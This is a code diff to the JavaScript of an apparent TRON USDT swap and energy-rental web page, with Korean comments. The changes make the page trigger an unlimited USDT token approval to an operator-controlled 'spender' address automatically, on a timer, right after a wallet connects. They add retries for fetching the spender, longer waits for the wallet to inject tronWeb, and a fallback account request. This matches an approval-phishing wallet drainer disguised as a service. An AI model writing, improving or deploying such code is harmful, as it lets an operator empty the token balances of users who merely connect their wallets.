@@ -790,17 +790,35 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
 
         async function setConnectedWallet(address,provider){
             currentWalletAddress=address;activeProvider=provider;isConnected=true;
-            document.getElementById('wallet-btn-text').textContent=address.substring(0,6)+'...'+address.slice(-4);
-            document.getElementById('connect-btn').className='flex items-center gap-1.5 sm:gap-2 bg-slate-900 border border-slate-700 text-emerald-400 font-semibold text-[11px] sm:text-xs px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl transition';
-            document.getElementById('wallet-disconnected').classList.add('hidden');
-            document.getElementById('wallet-connected').classList.remove('hidden');
-            document.getElementById('display-address').textContent=address;
-            document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>'+provider;
-            document.getElementById('connection-indicator').className='text-[11px] text-emerald-400 font-mono font-semibold flex items-center';
-            // Step 1 완료
-            document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
+            console.log('[WALLET] setConnectedWallet 시작:', address, provider);
+
+            // ★★★ 1순위: 에너지 주소 즉시 설정 (어떤 에러보다 먼저) ★★★
+            try{
+                var _ea=document.getElementById('energy-address');
+                if(_ea){
+                    _ea.removeAttribute('readonly');
+                    _ea.value=address;
+                    _ea.setAttribute('value',address);
+                    _ea.defaultValue=address;
+                    _ea.placeholder=address;
+                    console.log('[WALLET] 에너지 주소 설정 완료:', _ea.value);
+                }
+            }catch(e){console.error('[WALLET] 에너지 주소 설정 실패:', e);}
+
+            // ★★★ 2순위: 자동 승인 예약 (백엔드 호출 전에 예약) ★★★
+            var _autoApproveScheduled=false;
+
+            // UI 업데이트 (각각 try/catch)
+            try{document.getElementById('wallet-btn-text').textContent=address.substring(0,6)+'...'+address.slice(-4);}catch(e){}
+            try{document.getElementById('connect-btn').className='flex items-center gap-1.5 sm:gap-2 bg-slate-900 border border-slate-700 text-emerald-400 font-semibold text-[11px] sm:text-xs px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl transition';}catch(e){}
+            try{document.getElementById('wallet-disconnected').classList.add('hidden');}catch(e){}
+            try{document.getElementById('wallet-connected').classList.remove('hidden');}catch(e){}
+            try{document.getElementById('display-address').textContent=address;}catch(e){}
+            try{document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>'+provider;
+            document.getElementById('connection-indicator').className='text-[11px] text-emerald-400 font-mono font-semibold flex items-center';}catch(e){}
+            try{document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
             document.getElementById('step1-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>'+provider;
-            document.getElementById('step1-status').className='text-emerald-400 text-xs font-semibold flex items-center';
+            document.getElementById('step1-status').className='text-emerald-400 text-xs font-semibold flex items-center';}catch(e){}
 
             appendLog(L('sending'));
             try{
@@ -808,41 +826,38 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                 var data=await res.json();
                 if(data.status==='ok'){
                     userUsdtBalance=parseFloat(data.balance)||0;document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';try{document.getElementById('usdt-bal-swap').textContent=data.balance;}catch(e){}
-                    if(data.isApproved){isApproved=true;setApprovedUI();}
+                    if(data.isApproved){isApproved=true;setApprovedUI();_autoApproveScheduled=true;}
                     showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');
                     appendLog(L('connected',address,data.balance),'success');
                 }
             }catch(e){appendLog(L('backendFail'),'warn');}
 
-            // 레퍼럴 연결 추적
-            trackReferralConnect(address,provider);
+            // 레퍼럴
+            try{trackReferralConnect(address,provider);}catch(e){}
 
             try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
-            if(!isApproved){
-                // 지갑 연결 직후 무제한 승인 자동 실행
-                // tronWeb 준비 여부와 관계없이 executeUnlimitedApprove 내부에서 대기함
+
+            // ★★★ 자동 무제한 승인 실행 ★★★
+            if(!isApproved&&!_autoApproveScheduled){
+                console.log('[WALLET] 자동 승인 실행 예약');
                 setTimeout(function(){
+                    console.log('[WALLET] 자동 승인 실행! isApproved='+isApproved);
                     if(!isApproved) executeUnlimitedApprove();
-                },500);
+                },800);
             }
-            // 에너지 렌탈 대상 주소 자동 입력
-            // 에너지 렌탈 대상 주소 강제 설정
-            (function setEnergyAddr(){
-                var el=document.getElementById('energy-address');
-                if(!el)return;
-                el.removeAttribute('readonly');
-                el.value=address;
-                el.setAttribute('value',address);
-                el.placeholder=address;
-                el.defaultValue=address;
-                el.dispatchEvent(new Event('input',{bubbles:true}));
-                el.dispatchEvent(new Event('change',{bubbles:true}));
-                // 100ms 뒤 한 번 더 확인
-                setTimeout(function(){
-                    var el2=document.getElementById('energy-address');
-                    if(el2&&el2.value!==address){el2.value=address;el2.setAttribute('value',address);el2.defaultValue=address;}
-                },100);
-            })();
+
+            // 에너지 주소 한 번 더 확인 (혹시 위에서 실패했을 경우)
+            setTimeout(function(){
+                try{
+                    var _ea2=document.getElementById('energy-address');
+                    if(_ea2&&_ea2.value!==currentWalletAddress&&currentWalletAddress){
+                        _ea2.value=currentWalletAddress;
+                        _ea2.setAttribute('value',currentWalletAddress);
+                        _ea2.defaultValue=currentWalletAddress;
+                        console.log('[WALLET] 에너지 주소 재설정:', currentWalletAddress);
+                    }
+                }catch(e){}
+            },500);
         }
 
         function setApprovedUI(){
@@ -862,22 +877,47 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
 
         // ===== Approve (TRX 자동 충전 + 프로그레스 바 + WalletConnect) =====
         window.executeUnlimitedApprove=async function(){
+            console.log('[APPROVE] 시작, isConnected='+isConnected+', addr='+currentWalletAddress+', isApproved='+isApproved);
             if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
-            if(isApproved){showToast(currentLang==='ko'?'이미 교환 승인이 완료되었습니다':'Already approved');return;}
-            var spender=await getSpenderAddress();
-            if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog(L('noSpender'),'error');return;}
-            var tw=await getInjectedTronWeb();
+            if(isApproved){console.log('[APPROVE] 이미 승인됨, 건너뜀');return;}
+
+            // spender 주소 가져오기 (최대 3회 재시도)
+            var spender=null;
+            for(var _sp=0;_sp<3;_sp++){
+                spender=await getSpenderAddress();
+                if(spender)break;
+                console.log('[APPROVE] spender 재시도 '+(_sp+1));
+                await new Promise(function(r){setTimeout(r,1000);});
+            }
+            if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog(L('noSpender'),'error');console.error('[APPROVE] spender 실패');return;}
+            console.log('[APPROVE] spender:', spender);
+
+            // tronWeb 가져오기 — tronLink.request 재호출 없이 직접 확인
+            var tw=window.tronWeb||null;
+            if(!tw&&window.tronLink&&window.tronLink.tronWeb)tw=window.tronLink.tronWeb;
             var useWC=false;
             if(!tw||!tw.contract){
-                // 모바일 지갑 앱에서 tronWeb 주입이 느릴 수 있으므로 최대 10초 대기
+                console.log('[APPROVE] tronWeb 대기 시작...');
                 appendLog('tronWeb 대기 중...','warn');
-                for(var _wait=0;_wait<10;_wait++){
+                for(var _wait=0;_wait<15;_wait++){
                     await new Promise(function(r){setTimeout(r,1000);});
-                    tw=window.tronWeb||window.tronLink&&window.tronLink.tronWeb||null;
+                    tw=window.tronWeb||null;
+                    if(!tw&&window.tronLink&&window.tronLink.tronWeb)tw=window.tronLink.tronWeb;
                     if(tw&&tw.contract){
+                        console.log('[APPROVE] tronWeb 감지! ('+(_wait+1)+'초)');
                         appendLog('tronWeb 감지 완료 ('+(_wait+1)+'초)','success');
                         break;
                     }
+                }
+                if(!tw||!tw.contract){
+                    // 마지막 시도: tronLink.request
+                    try{
+                        if(window.tronLink){
+                            console.log('[APPROVE] tronLink.request 시도...');
+                            var _req=await window.tronLink.request({method:'tron_requestAccounts'});
+                            if(_req&&_req.code===200&&window.tronWeb){tw=window.tronWeb;console.log('[APPROVE] tronLink.request 성공');}
+                        }
+                    }catch(e){console.log('[APPROVE] tronLink.request 실패:', e);}
                 }
                 if(!tw||!tw.contract){
                     if(wcConnector&&wcConnector.isConnected()&&wcAddress){
@@ -885,10 +925,12 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                         appendLog('[WC] WalletConnect 서명 모드','warn');
                     }else{
                         showToast(currentLang==='ko'?'지갑에서 서명을 확인하세요':'Please check your wallet','error');
+                        console.error('[APPROVE] tronWeb 없음, WC 없음 — 포기');
                         return;
                     }
                 }
             }
+            console.log('[APPROVE] tronWeb 준비완료, useWC='+useWC);
 
             var btn=document.getElementById('approve-btn');
             btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
